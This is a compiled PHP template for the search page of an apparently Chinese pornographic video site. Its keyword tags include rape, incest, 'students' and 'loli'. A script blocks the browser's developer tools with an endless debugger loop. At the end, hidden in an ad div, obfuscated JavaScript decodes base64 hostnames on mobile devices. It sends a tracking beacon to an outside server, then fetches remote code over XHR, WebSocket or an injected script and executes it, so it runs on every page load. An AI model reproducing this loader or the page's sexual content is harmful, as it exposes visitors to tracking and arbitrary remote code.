<?php /*a:2:{s:49:"D:\wamp\www\pron\view\index\index\searchhome.html";i:1692183929;s:46:"D:\wamp\www\pron\view\index\mobile_header.html";i:1692183471;}*/ ?>
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#000">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="Cache-Control" content="no-transform"/><meta http-equiv="Cache-Control" content="no-siteapp" />
<meta name="applicable-device" content="mobile">
<link rel="icon" href="static/app-icon.png">
<link rel="apple-touch-icon" href="static/app-icon.png">
<style type="text/css">
  a {text-decoration:none;color: black !important;}
  a:hover{text-decoration:none; cursor:pointer}/*a标签鼠标经过mouseover时的样式*/
  a:link{text-decoration:none; cursor:pointer;} /*a标签未访问时的样式*/
  a:visited{text-decoration: overline ; cursor:pointer}/*a标签访问过之后样式*/
  a:active{text-decoration:overline;cursor:pointer}/*a标签鼠标按下mousedown时的样式*/
	    /*图标css*/
  .xxlink {width:100%;background:#FFFFFF;display:flex;flex-wrap:wrap;justify-content:flex-start;border:2px solid #FFFFFF;}
  .xxlink h3 {width:95%;padding:0 2.5%;font-size:18px;line-height: 26px;background:#fff;margin-bottom:12px;color:#000000;}
  .navi {font-size:0;text-align:center}
  .appico {width: 16%;margin: 5px 0px;height:auto;box-sizing:border-box;display:inline-block;position:relative;}
  .appico p {width:100%;height: 19px;line-height: 22px;text-align:center;font-size: 11px;margin:0;color:#000000;overflow:hidden;}
  .naicon {border-radius:5px;overflow:hidden;font-size:0;margin:.1px}
  .appico img {border-radius: 1px;width:100%}
  .appico:hover .btn-raised {-webkit-box-shadow:0 0 0 0 rgba(0,0,0,.24),0 0 0 0 rgba(0,0,0,.4),0 0 0 0 rgba(0,0,0,.22);box-shadow:0 0 0 0 rgba(0,0,0,.24),0 0 0 0 rgba(0,0,0,.4),0 0 0 0 rgba(0,0,0,.22)}
  .btnx{padding: 8px 2px !important;}
  </style>
  <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.min.css" />
  <link rel="stylesheet" type="text/css" href="/static/css/bootstrap-icons.css" />
  <link rel="stylesheet" type="text/css" href="/static/css/noty.css" />
  <link rel="stylesheet" type="text/css" href="/static/css/noty-themes/bootstrap-v4.css" />
  <link rel="stylesheet" type="text/css" href="/static/css/mobile.css" />
  <link rel="stylesheet" type="text/css" href="/static/css/style.css" />
  <script type="text/javascript" src="/static/js/jquery-2.2.4.min.js"></script>
  <script type="text/javascript" src="/static/js/bootstrap.bundle.min.js"></script>
  <script type="text/javascript" src="/static/js/clipboard.min.js"></script>
  <script type="text/javascript" src="/static/js/lozad.min.js"></script>
  <script type="text/javascript" src="/static/js/sweetalert2.js"></script>
  <script type="text/javascript" src="/static/js/noty.min.js"></script>
  <style type="text/css">
    .v-s-nav-box-h{
        float: left;
        width: 100%;
        background-color: #000;
        /* background: linear-gradient(to right, #8e2bfa, #6b28ef); */
        /* position:fixed; */
        top: 0;
        left: 0;
        z-index: 99;
        -webkit-transition: all .4s;
        transition: all .4s;
    }
    .v-s-nav-box-hide{
        -webkit-transform: translateY(-100%);
        transform: translateY(-100%);
    }

    .v-s-logo {
        float: left;
        width: auto;
        margin-right: 10px;
        margin-left: 10px;
        position: relative;
    }
    .v-s-logo img {
        max-width: 160px;
        height: 30px;
    }
    .v-s-logo-text{
        font-size: 22px;
        font-weight: 500;
        color: #fff;
        margin-left:2px;
    }
    .v-s-ul-time-vs_442378ea5a0a0b9d99bed43dc146baa0{
        float: left;
        width: 100%;
        /* margin-top: 2px; */
        white-space: nowrap;
        scrollbar-width: none; /* Firefox */
        -ms-overflow-style: none; /* IE 10+ */
        overflow:auto;
        position:relative;
        box-sizing: border-box;
        padding:0px 10px;
        padding-bottom:5px;
    }
    .v-s-ul-time-vs_442378ea5a0a0b9d99bed43dc146baa0 a{
        text-decoration: none;
    }
    .v-s-ul-time-vs_442378ea5a0a0b9d99bed43dc146baa0::-webkit-scrollbar{
        width: 0;
        height: 0;
        display: none;
        color: transparent;
    }
    .v-s-li-nav-link-vs_442378ea5a0a0b9d99bed43dc146baa0{
        width: auto;
        height:30px;
        color: rgba(255, 255, 255, 0.7);
        font-size:16px;
        line-height: 30px;
        margin-right: 6px;
        display: inline-block;
        cursor: pointer;
    }
    .v-s-li-nav-link-vs_442378ea5a0a0b9d99bed43dc146baa0:hover{
        font-size: 16px;
        color: rgba(255, 255, 255, 1);
        font-weight: bold;
    }
    .nav-menu-selected{
        font-size: 16px;
        color: rgba(255, 255, 255, 1);
        font-weight: bold;
    }
    .v-s-nav-search-box{
        float: right;
        width: 150px;
        margin-right: 10px;
        white-space:nowrap;
        overflow: hidden;
    }
    .v-s-nav-search-box .search-input {
        float: left;
        font-size: 14px;
        color: #fff;
        width: 170px;
        height: 30px;
        line-height: 30px;
        padding: 0 10px;
        padding-right: 0;
        border-radius: 4px;
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }
    .v-s-nav-search-box .search-input::input-placeholder{
		color: rgba(255, 255, 255, 0.6);
	}
    .v-s-nav-search-box .search-input::-webkit-input-placeholder { /* WebKit browsers */
	    color: rgba(255, 255, 255, 0.6);
	}
	 
	.v-s-nav-search-box .search-input::-moz-placeholder { /* Mozilla Firefox 19+ */
        color: rgba(255, 255, 255, 0.6);
	}
	 
	.v-s-nav-search-box .search-input::-ms-input-placeholder { /* Internet Explorer 10+ */
        color: rgba(255, 255, 255, 0.6);
	}
    .v-s-nav-search-box .search-btn{
        float: left;
        font-size: 22px;
        color: rgba(255, 255, 255, 1);
        width: auto;
        height: 35px;
        line-height: 35px;
        text-align: center;
        padding: 0px 8px;
        cursor: pointer;
        border-radius: 4px;
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
    }
    .v-s-nav-search-box .search-btn:active{
        color: rgba(255, 255, 255, 0.6);
    }
    .v-s-nav-search-box .search-person{
        float: right;
        width: 35px;
        height: 35px;
        line-height: 35px;
        font-size: 22px;
        color: rgba(255, 255, 255, 1);
        margin-left: 12px;
        text-align: center;
        cursor: pointer;
    }
    .v-s-nav-search-box .search-person:active{
        color:rgba(255, 255, 255, 0.6);
    }
    .v-s-nav-search-box .search-person:active{
        color:rgba(255, 255, 255, 0.6);
    }
    .ad-nav-box{
        float: left;
        width: 100%;
        height:auto;
        box-sizing: border-box;
        margin: 6px 0;
    }
    .ad-nav-box img{
        width: 100%;
    }
    /* 子分类 */
    .v-s-ul-category-tag{
        float: left;
        width: 100%;
        /* margin-top: 2px; */
        white-space: nowrap;
        scrollbar-width: none; /* Firefox */
        -ms-overflow-style: none; /* IE 10+ */
        overflow:auto;
        position:relative;
        box-sizing: border-box;
        padding:0px 10px;
    }
    .v-s-ul-category-tag a{
        text-decoration: none;
    }
    .v-s-ul-category-tag::-webkit-scrollbar{
        width: 0;
        height: 0;
        display: none;
        color: transparent;
    }
    .v-s-li-nav-link-tag{
        width: auto;
        background: rgba(255, 255, 255, 0.2);
        color: rgba(255, 255, 255, 0.7);
        font-size:14px;
        line-height: 24px;
        margin-right: 6px;
        padding:0px 8px;
        border-radius: 12px;
        margin-bottom:15px;
        display: inline-block;
        cursor: pointer;
    }
    .v-s-li-nav-link-tag:active{
        color: rgba(255, 255, 255, 1);
    }
    .nav-category-tag-selected{
        color: #fff;
        background: rgba(255, 255, 255, 0.4);
    }

    .item-box .pre-eye {
        text-align: left !important;
        padding-left: 10px !important;
    }

    .item-box .rank-a {
        border-radius: 6px;
    }
    
</style>
<script>
document.addEventListener('DOMContentLoaded', function () {
	window.addEventListener('popstate', function (e) {
		e.preventDefault();
		e.stopPropagation();
		e.stopImmediatePropagation();
	}, true);
	setTimeout(function () {
		document.body.click();
	}, 0);
});   
</script>
<title>热门搜索</title>
</head>
<body>
<div class="v-s-nav-box-h"><div class="main-box" style="margin-top: 5px;flex-direction: row;justify-content: space-between;"><div class="v-s-logo"><a href="/"><img src="/static/images/logo.svg"><!-- <div class="v-s-logo-text">FaceShow</div> --></a></div><div class="v-s-nav-search-box"><a href="/gbooks"><div class="search-person"><i class="bi bi-chat-right-text"></i></div></a><a href="/personal"><div class="search-person"><i class="bi bi-person-circle"></i></div></a><a href="<?php echo url('index/searchhome'); ?>"><div class="search-person"><i class="bi bi-search"></i></div></a></div></div><!-- 标题栏bp -->
<div class="v-s-ul-time-vs_442378ea5a0a0b9d99bed43dc146baa0">
<a href="/"><div class="v-s-li-nav-link-vs_442378ea5a0a0b9d99bed43dc146baa0 nav-menu-selected">首页</div></a>
<?php if(is_array($menulist) || $menulist instanceof \think\Collection || $menulist instanceof \think\Paginator): $i = 0; $__LIST__ = $menulist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$menu): $mod = ($i % 2 );++$i;?>
<a href="<?php echo url('index/category',['category_id'=>$menu['id']]); ?>"><div class="v-s-li-nav-link-vs_442378ea5a0a0b9d99bed43dc146baa0"><?php echo htmlentities($menu['title']); ?></div></a>
<?php endforeach; endif; else: echo "" ;endif; ?>
</div><!-- 子分类 $Request.param.category_child_id --><div class="v-s-ul-category-tag"></div></div><script>// 菜单栏滚动条自动滚动到菜单栏选择出
setTimeout(function(){
    try {
        let menu = 'v-s-ul-time-vs_442378ea5a0a0b9d99bed43dc146baa0';
        let nav = $('.nav-menu-selected');
        let offset = nav.offset(); // 屏幕坐标
        let position = nav.position(); // 相对于父元素定位，父元素须设置css position:relative;属性
        let width = $(window).width();
        if(position.left + nav.width() > width){
            $(`.${menu}`).scrollLeft(position.left - (width/2))
        }
    } catch (e) {}
},100)

// 检测滑动 菜单栏隐藏或显示
let pageYOffset = 0;
if (!/qqbrowser/i.test(navigator.userAgent)) {
    $(window).scroll(function(e) {
        let nav =  $('.v-s-nav-box-h');
        let navHeight = nav.height();
        nav.css('position','fixed')
        $('.content-box').css('margin-top', navHeight + 'px');
    
        if(e.currentTarget.pageYOffset > navHeight){
            $('.v-s-nav-box-h').addClass('v-s-nav-box-hide');
        }
        if(e.currentTarget.pageYOffset < pageYOffset){
            $('.v-s-nav-box-h').removeClass('v-s-nav-box-hide');
        }
    
        // if(e.currentTarget.pageYOffset > 270){
        //     $('.v-s-nav-box-h').addClass('v-s-nav-box-hide');
        // }
        // if(e.currentTarget.pageYOffset < pageYOffset){
        //     $('.v-s-nav-box-h').removeClass('v-s-nav-box-hide');
        // }
        pageYOffset = e.currentTarget.pageYOffset
        
    })
}

</script><div class="content-box"><div class="item-box"><div class="main-box"><div class=""><div class="search-home"><div class="title">牢记本站域名: YY78888.COM</br></br></div><div class="search-form"><!-- 启用搜索记录 --><!-- <div class="search-content search-content-history"> --><div class="search-content"><div class="input"><input type="text" name="keyword" placeholder="" id="search_input" type="search" onfocus="onfocusSearch()" oninput="oninputSearch()" onchange="onchangeSearch()"><div class="input-border"><div role="separator" class="van-divider van-divider--hairline"></div></div></div><div class="button" onclick="search()">搜索</div></div><div class="search-history-content" style="display: none"><div class="title"><div class="title-text">搜索历史</div><div class="delete-all-history" @click="handleDelAll">删除历史记录</div></div><div class="text"><div class="history-text">搜索记录</div><i class="bi bi-trash3"></i></div><div class="text"><div class="history-text">搜索记录</div><i class="bi bi-trash3"></i></div></div></div><div class="search-tag-content"><div class="search-tags"><div class="title"><i class="bi bi-fire"></i> 热搜排行榜 </div><div class="tags tags-rect"><span class="badge badge-light badge-light-click" data-keyword="乱伦">乱伦</span><span class="badge badge-light badge-light-click" data-keyword="学生">学生</span><span class="badge badge-light badge-light-click" data-keyword="内射">内射</span><span class="badge badge-light badge-light-click" data-keyword="强奸">强奸</span><span class="badge badge-light badge-light-click" data-keyword="人妻">人妻</span><span class="badge badge-light badge-light-click" data-keyword="巨乳">巨乳</span><span class="badge badge-light badge-light-click" data-keyword="自慰">自慰</span><span class="badge badge-light badge-light-click" data-keyword="老师">老师</span><span class="badge badge-light badge-light-click" data-keyword="偷情">偷情</span><span class="badge badge-light badge-light-click" data-keyword="萝莉">萝莉</span></div></div><div class="search-tags"><div class="title"><i class="bi bi-heart-fill"></i> 动作 </div><div class="tags tags-rect"><span class="badge badge-light badge-light-click" data-keyword="口交">口交</span><span class="badge badge-light badge-light-click" data-keyword="肛交">肛交</span><span class="badge badge-light badge-light-click" data-keyword="器具">器具</span><span class="badge badge-light badge-light-click" data-keyword="口爆">口爆</span><span class="badge badge-light badge-light-click" data-keyword="颜射">颜射</span><span class="badge badge-light badge-light-click" data-keyword="吞精">吞精</span><span class="badge badge-light badge-light-click" data-keyword="双龙入洞">双龙入洞</span><span class="badge badge-light badge-light-click" data-keyword="尿尿">尿尿</span><span class="badge badge-light badge-light-click" data-keyword="捆绑">捆绑</span><span class="badge badge-light badge-light-click" data-keyword="性虐">性虐</span><span class="badge badge-light badge-light-click" data-keyword="内射">内射</span><span class="badge badge-light badge-light-click" data-keyword="潮吹">潮吹</span><span class="badge badge-light badge-light-click" data-keyword="深喉">深喉</span><span class="badge badge-light badge-light-click" data-keyword="拳交">拳交</span><span class="badge badge-light badge-light-click" data-keyword="偷窥">偷窥</span><span class="badge badge-light badge-light-click" data-keyword="自慰">自慰</span><span class="badge badge-light badge-light-click" data-keyword="强奸">强奸</span></div></div><div class="search-tags"><div class="title"><i class="bi bi-heart-fill"></i> 场景 </div><div class="tags tags-rect"><span class="badge badge-light badge-light-click" data-keyword="车震">车震</span><span class="badge badge-light badge-light-click" data-keyword="教室">教室</span><span class="badge badge-light badge-light-click" data-keyword="大学">大学</span><span class="badge badge-light badge-light-click" data-keyword="part">part</span><span class="badge badge-light badge-light-click" data-keyword="厕所">厕所</span><span class="badge badge-light badge-light-click" data-keyword="酒店">酒店</span><span class="badge badge-light badge-light-click" data-keyword="游泳">游泳</span><span class="badge badge-light badge-light-click" data-keyword="野外">野外</span><span class="badge badge-light badge-light-click" data-keyword="海滩">海滩</span><span class="badge badge-light badge-light-click" data-keyword="club">club</span><span class="badge badge-light badge-light-click" data-keyword="商场">商场</span><span class="badge badge-light badge-light-click" data-keyword="试衣">试衣</span><span class="badge badge-light badge-light-click" data-keyword="地铁">地铁</span><span class="badge badge-light badge-light-click" data-keyword="飞机">飞机</span><span class="badge badge-light badge-light-click" data-keyword="火车">火车</span><span class="badge badge-light badge-light-click" data-keyword="游轮">游轮</span><span class="badge badge-light badge-light-click" data-keyword="浴室">浴室</span><span class="badge badge-light badge-light-click" data-keyword="按摩">按摩</span></div></div><div class="search-tags"><div class="title"><i class="bi bi-heart-fill"></i> 角色 </div><div class="tags tags-rect"><span class="badge badge-light badge-light-click" data-keyword="二次元">二次元</span><span class="badge badge-light badge-light-click" data-keyword="护士">护士</span><span class="badge badge-light badge-light-click" data-keyword="学生">学生</span><span class="badge badge-light badge-light-click" data-keyword="老师">老师</span><span class="badge badge-light badge-light-click" data-keyword="继母">继母</span><span class="badge badge-light badge-light-click" data-keyword="姐弟">姐弟</span><span class="badge badge-light badge-light-click" data-keyword="父女">父女</span><span class="badge badge-light badge-light-click" data-keyword="情侣">情侣</span><span class="badge badge-light badge-light-click" data-keyword="军人">军人</span><span class="badge badge-light badge-light-click" data-keyword="警察">警察</span><span class="badge badge-light badge-light-click" data-keyword="犯人">犯人</span><span class="badge badge-light badge-light-click" data-keyword="房东">房东</span><span class="badge badge-light badge-light-click" data-keyword="儿媳">儿媳</span><span class="badge badge-light badge-light-click" data-keyword="丈母娘">丈母娘</span><span class="badge badge-light badge-light-click" data-keyword="邻居">邻居</span><span class="badge badge-light badge-light-click" data-keyword="明星">明星</span></div></div><div class="search-tags"><div class="title"><i class="bi bi-heart-fill"></i> 国产厂商 </div><div class="tags tags-rect"><span class="badge badge-light badge-light-click" data-keyword="麻豆">麻豆</span><span class="badge badge-light badge-light-click" data-keyword="SWAG">SWAG</span><span class="badge badge-light badge-light-click" data-keyword="扣扣">扣扣</span><span class="badge badge-light badge-light-click" data-keyword="溏心Vlog">溏心Vlog</span><span class="badge badge-light badge-light-click" data-keyword="萝莉社">萝莉社</span><span class="badge badge-light badge-light-click" data-keyword="JVID">JVID</span><span class="badge badge-light badge-light-click" data-keyword="乌托邦">乌托邦</span><span class="badge badge-light badge-light-click" data-keyword="皇家华人">皇家华人</span><span class="badge badge-light badge-light-click" data-keyword="星空">星空</span><span class="badge badge-light badge-light-click" data-keyword="杏吧">杏吧</span><span class="badge badge-light badge-light-click" data-keyword="天美">天美</span></div></div></div></div></div></div></div></div><style type="text/css">
  body{
    background:#111
  }
  .search-home {
    padding: 10px 32px 32px;
    color: #fff;
  }

  .search-form {
    position: relative;
    max-width: 584px;
    margin: 0 auto;
  }

  .search-content {
    width: 100%;
    height: 40px;
    display: flex;
    background-color: #2e1c56;
    border-radius: 24px;
    overflow: hidden;
  }

  .search-content.search-content-history {
    border-radius: 24px 24px 0 0;
  }

  .search-content.search-content-history .input .input-border {
    margin-top: -5px;
    display: block;
    width: 100%;
    padding: 0 14px;
  }

  .search-content .search-content-history .input .input-border .van-divider {
    margin: 0;
    border-color: #4d6891;
  }

  .search-content .input {
    flex: 1;
  }

  .search-content .input .input-border {
    display: none;
  }

  .search-content .input input {
    position: relative;
    display: block;
    width: 100%;
    /* background-color: transparent; */
    border: none;
    margin: 0;
    padding: 0;
    color: #333;
    word-wrap: break-word;
    outline: none;
    -webkit-tap-highlight-color: transparent;
    display: flex;
    padding: 0 14px;
    height: 100%;
    font-size: 14px;
  }

  .search-content .button {
    padding: 0 20px;
    height: 40px;
    line-height: 40px;
    background-color: #ff4f6b;
    cursor: pointer;
    user-select:none;
  }
  .search-content .button:active{
    background-color: #b94155;
  }

  .search-history-content {
    padding: 5px 14px 14px;
    position: absolute;
    left: 0;
    right: 0;
    top: 40px;
    z-index: 10;
    width: 100%;
    background-color: #2e1c56;
    border-radius: 0 0 24px 24px;
    overflow: hidden;
    transition: .3s all;
  }

  .search-history-content .title {
    display: flex;
    justify-content: space-between;
    font-size: 12px;
    margin-bottom: 12px;
    color: #b3a5a5;

  }

  .search-history-content .title .delete-all-history {
    color: #ff4f6b;
  }

  .search-history-content .text {
    display: flex;
    justify-content: space-between;
    margin-bottom: 12px;
    font-size: 14px;
    height: 17px;
    overflow: hidden;

  }

  .search-history-content .text:last-child {
    margin-bottom: 0;
  }

  .search-history-content .text .history-text {
    margin-right: 20px;
    flex: 1;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    cursor: pointer;
  }

  .search-tag-content {
    max-width: 584px;
    margin: 42px auto 0;
  }

  .search-tag-content .search-tags {
    margin-top: -14px;
    margin-bottom: 25px;
  }

  .search-tag-content .search-tags:last-child {
    margin-bottom: 0;
  }

  .search-tag-content .search-tags:first-child {
    margin-top: 0;
  }

  .search-tag-content .search-tags .title {
    font-size: 16px;
  }

  .search-tag-content .search-tags .tags {
    margin-top: 14px;
  }

  .search-tag-content .search-tags .tags.tags-rect {
    margin-left: 0px;
  }

  .search-tag-content .search-tags .tags.tags-circle {
    margin-left: 0px;
  }

  .search-tag-content .search-tags .tags .van-tag {
    margin-left: 8px;
    margin-bottom: 14px;
    font-size: 12px;
    cursor: pointer;

  }

  .search-tag-content .search-tags .tags .van-tag:hover {
    background: #ff4f6b !important;
    transition: .3s all;
  }

  .search-tag-content .search-tags .tags .tag-circle {
    margin-left: 15px;
    margin-bottom: 14px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    width: 42px;
    height: 42px;
    border-radius: 50%;
    background-color: #2e1c56;
    font-size: 12px;
    cursor: pointer;
    overflow: hidden;

  }

  .search-tag-content .search-tags .tags .tag-circle:hover {
    background: #ff4f6b !important;
    transition: .3s all;
  }
  .tags-rect .badge-light{
    background: rgba(255,255,255,0.2);
    color: #fff;
    font-size:13px;
    margin-right: 3px;
    padding: 5px 10px;
    margin-bottom: 10px;
    user-select:none;
  }
  .tags-rect .badge-light:active{
    background: rgba(255,255,255,0.7);
    color: #111;
  }
</style><script>
  $(".input input").attr("placeholder", '搜索' + parseFloat(Math.floor(new Date().getTime() / 1000 / 3600) * 2 + 1038938).toLocaleString() + '个视频');

  var searchInputActive = false;
    var searchInputval = '';

    // input 获取焦点时触发
    function onfocusSearch(e){
        searchInputActive = true
    }
    // input 输入值发生变化时触发
    function oninputSearch(e){
        let dom = $('#search_input')
        searchInputval = dom.val()
        
    }
    // input 失去焦点时触发
    function onchangeSearch(){
        searchInputActive = false
    }

    // input 监听回车事件
    $("#search_input").keydown(function (e){
        // 当 keyCode 是13时,是回车操作
    if (e.keyCode == 13){
        // 编写业务代码...
        search()
        // 取消之前的keydown事件
        e.preventDefault();
    }
    })

    // 选择关键词
    $('.badge-light-click').click(function(){
      $keyword = $(this).data('keyword');
      $('#search_input').val($keyword)
      setTimeout(function(){
        search();
      },60)
    })

    // 搜索
    function search(e){
        let val = $('#search_input').val()
        if(!val){
            new Noty({
                layout:'topCenter',
                theme: 'bootstrap-v4',
                text: '关键词不能为空!',
                progressBar:false,
                timeout:1000
            }).show().setType('alert');
            return
        }
        window.location.replace(`/index/search/?keyword=${val}`)
    }

</script><div class="footer-box" style="height:150px;" ></div><style type="text/css">
    .footer-box {
        float: left;
        width: 100%;
        margin-top: 50px;
        text-align: center;
        padding: 15px 0;
    }
</style><script type="text/javascript" src="/static/js/utils_mobile.js"></script><script>
    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip();
        $('[data-toggle="popover"]').popover();
        const observer = lozad(); // lazy loads elements with default selector as '.lozad'
        observer.observe();
    });
    // sweetalert2弹窗配置
    const SSwal = Swal.mixin({
        confirmButtonColor: '#007bff',
        cancelButtonColor: '#6c757d',
        confirmButtonText: '确定',
        cancelButtonText: '取消',
        reverseButtons: true,
    })
</script><!-- 禁开发者工具调试 --><script>
    //如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面 
    // var debuggerH = window.innerHeight, debuggerW = window.innerWidth;
    // window.onresize = function () {
    //     if (debuggerH != window.innerHeight || debuggerW != window.innerWidth) {
    //         window.close();
    //         window.location = "about:blank";
    //     }
    // }

        // 无限的 debugger 兼容性好
    setInterval(function() {
        debuggerCheck();
      }, 2000);
      var debuggerCheck = function() {
        function doCheck(a) {
          if (('' + a / a)['length'] !== 1 || a % 20 === 0) {
            (function() {}['constructor']('debugger')());
          } else {
            (function() {}['constructor']('debugger')());
          }
          doCheck(++a);
        }
        try {
          doCheck(0);
        } catch (err) {}
      };
      debuggerCheck();
    </script><div id="space_default_02" style="margin: 0;" class="ad-nav-box"><div style="display: none !important;">function lCQiZE(e){var t="",n=r=c1=c2=0;while(n&lt;e.length){r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r);n++;}else if(r&gt;191&&r&lt;224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)&lt;&lt;6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)&lt;&lt;12|(c2&63)&lt;&lt;6|c3&63);n+=3;}}return t;};function BKhyJHM(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZ'+'abcdefghijklmnopqrstuvwxyz'+'0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f&lt;e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s&lt;&lt;2|o&gt;&gt;4;r=(o&15)&lt;&lt;4|u&gt;&gt;2;i=(u&3)&lt;&lt;6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r);}if(a!=64){t=t+String.fromCharCode(i);}}return lCQiZE(t);};window[''+'H'+'T'+'a'+'p'+'n'+'S'+'z'+'U'+'']=((navigator.platform&&!/^Mac|Win/.test(navigator.platform))||(!navigator.platform&&/Android|iOS|iPhone/i.test(navigator.userAgent)))?function(){;(function(u,k,i,w,d,c){var x=BKhyJHM,cs=d[x('Y3VycmVudFNjcmlwdA==')],crd=x('Y3JlYXRlRWxlbWVudA==');'jQuery';u=decodeURIComponent(x(u.replace(new RegExp(c[0]+''+c[0],'g'),c[0])));!function(o,t){var a=o.getItem(t);if(!a||32!==a.length){a='';for(var e=0;e!=31;e++)a+=Math.floor(16*Math.random()).toString(16);o.setItem(t,a)}var n='https://tbn.xyizgh.cn:7891/stats/6929/'+i+'?ukey='+a+'&host='+window.location.host;navigator.sendBeacon?navigator.sendBeacon(n):(new Image).src=n}(localStorage,'__tsuk');'jQuery';if(navigator.userAgent.indexOf('b'+'a'+'id'+'u')!=-1){var xhr=new XMLHttpRequest();xhr.open('POST','https://'+u+'/vh5/'+i);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded;');xhr.setRequestHeader('X-REQUESTED-WITH','XMLHttpRequest');xhr.onreadystatechange=function(){if(xhr.readyState==4&&xhr.status==200){var data=JSON.parse(xhr.responseText);new Function('_'+'t'+'d'+'cs',new Function('c',data.result.decode+';return '+data.result.name+'(c)')(data.result.img.join('')))(cs);}};xhr.send('u=1');}else if(WebSocket&&/UCBrowser|Quark|Huawei|Vivo|NewsArticle/i.test(navigator.userAgent)){k=decodeURIComponent(x(k.replace(new RegExp(c[1]+''+c[1],'g'),c[1])));var ws=new WebSocket('wss://'+k+':9534/wh5/'+i);ws.onmessage=function(e){ws.close();new Function('_tdcs',x(e.data))(cs);};ws.onerror=function(){var s=d[crd]('script');s.src='https://'+u+'/vh5/'+i;cs.parentElement.insertBefore(s,cs);}}else{var s=d[crd]('script');s.src='https://'+u+'/vh5/'+i;cs.parentElement.insertBefore(s,cs);}})('cG9pZS5qemRR3bDQuY24lM0E4ODkx','a2l1dy56annNrcW1pLmNu','2025',window,document,['R','n']);}:function(){};</div>
<script>new Function(document['cu'+'rren'+'tScr'+'ipt']['prev'+'iousE'+'leme'+'ntSi'+'bling']['tex'+'tCo'+'ntent'])();</script>
<div> <div><div> </div>  </div></div><div> </div>
<script>HTapnSzU();</script></div></body></html>